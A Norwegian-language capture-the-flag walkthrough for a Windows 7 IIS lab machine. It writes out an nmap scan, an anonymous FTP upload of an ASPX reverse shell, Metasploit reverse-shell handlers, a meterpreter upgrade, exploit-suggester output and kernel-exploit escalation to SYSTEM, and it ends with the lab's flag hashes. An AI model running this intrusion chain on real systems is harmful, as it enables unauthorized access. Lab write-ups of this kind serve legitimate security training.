# devel 10.10.10.5

**last opp is.aspx**

**skaff shell**

**gjør om til meterpreter \(set lport 4434\)**

**kjør ps: migrate til hvilken som helst prosess som er system. woosh**

windows maskin

`oot@kali:~# nmap -sS -P0 10.10.10.5`

`Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-26 09:47 EDT`

`Nmap scan report for 10.10.10.5`

`Host is up (0.061s latency).`

`Not shown: 998 filtered ports`

`PORT   STATE SERVICE`

`21/tcp open  ftp`

`80/tcp open  http`

logget inn **ftp **med **anonymous**.   login med -i som fjerner prompts

http kjører iis7

fikk et skikkelig shell med [https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/](https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/)

**windows 7 6.1 build 7600 x86**

**koble et shell rett inn i metasploit og oppgradere til meterpreter**

```
* use multi/handler

* set LHOST attack-machine

* set LPORT port-as-appropraite

* set payload windows/shell/reverse\_tcp

* exploit'
```

background session med ctrl z&lt;

`use post/multi/manage/shell_to_meterpreter`

kan her kjøre kommandoer.

```
net users
```

    Administrator            babis                    Guest**
    ``

    /c whoami = iis apppool\**web**



    **

use post/multi/recon/local\_exploit\_suggester **            
**FORSØKT ALLE DISSE UTEN HELL\*\*

```
\[+\] 10.10.10.5 - exploit/windows/local/bypassuac\_eventvwr: The target appears to be vulnerable.

\[+\] 10.10.10.5 - exploit/windows/local/ms10\_015\_kitrap0d: The target service is running, but could not be validated.

\[+\] 10.10.10.5 - exploit/windows/local/ms10\_092\_schelevator: The target appears to be vulnerable.

\[+\] 10.10.10.5 - exploit/windows/local/ms13\_053\_schlamperei: The target appears to be vulnerable.

\[+\] 10.10.10.5 - exploit/windows/local/ms13\_081\_track\_popup\_menu: The target appears to be vulnerable.

\[+\] 10.10.10.5 - exploit/windows/local/ms14\_058\_track\_popup\_menu: The target appears to be vulnerable.

\[+\] 10.10.10.5 - exploit/windows/local/ms15\_004\_tswbproxy: The target service is running, but could not be validated.

\[+\] 10.10.10.5 - exploit/windows/local/ms15\_051\_client\_copy\_image: The target appears to be vulnerable.

\[+\] 10.10.10.5 - exploit/windows/local/ms16\_016\_webdav: The target service is running, but could not be validated.

\[+\] 10.10.10.5 - exploit/windows/local/ms16\_032\_secondary\_logon\_handle\_privesc: The target service is running, but could not be validated.

\[+\] 10.10.10.5 - exploit/windows/local/ppr\_flatten\_rec: The target appears to be vulnerable.
```

getsystem = ingenting

```
wmic qfe get
```

no work :\(

sjekke hvilke prossesser som kjører med admin privelege.

```
use post/windows/gather/enum_patches
```

msf post\(shell\_to\_meterpreter\) &gt; use post/windows/gather/enum\_patches  
msf post\(enum\_patches\) &gt; set session 2  
session =&gt; 2  
msf post\(enum\_patches\) &gt; exploit

\[-\] Post failed: NoMethodError undefined method `[]' for nil:NilClass            
[-] Call stack:            
[-]   /usr/share/metasploit-framework/modules/post/windows/gather/enum_patches.rb:72:in`run'  
\[\*\] Post module execution completed

msf post\(enum\_patches\) &gt; run

\[-\] Known bug in WMI query, try migrating to another process  
\[\*\] Post module execution completed

**forsøkte å bypasse uac**  
msf exploit\(bypassuac\) &gt; exploit

\[_\] Started reverse TCP handler on 10.0.0.8:4444  
\[_\] UAC is Enabled, checking level...  
\[+\] UAC is set to Default  
\[+\] BypassUAC can bypass this setting, continuing...  
\[-\] Exploit aborted due to failure: no-access: Not in admins group, cannot escalate with this module

**greide å få powershell**

```
use exploit/windows/local/payload_inject
set payload windows/powershell_reverse_tcp

exploit/windows/local/ms16_032_secondary_logon_handle_privesc funekr ikke fordi det bare er et ettkjerne vm. krever to kjerner
```

```
use exploit/windows/local/ms13\_053\_schlamperei
tror det var denne som ordnet det. kjørte getsystem of fikk SYSTEM
det var riktig ja
```

type root.txt.txt

**e621a0b5041708797c4fc4728bc72b4b**

type user.txt.txt

**9ecdd6a3aedf24b41562fea70f4cb3e8**

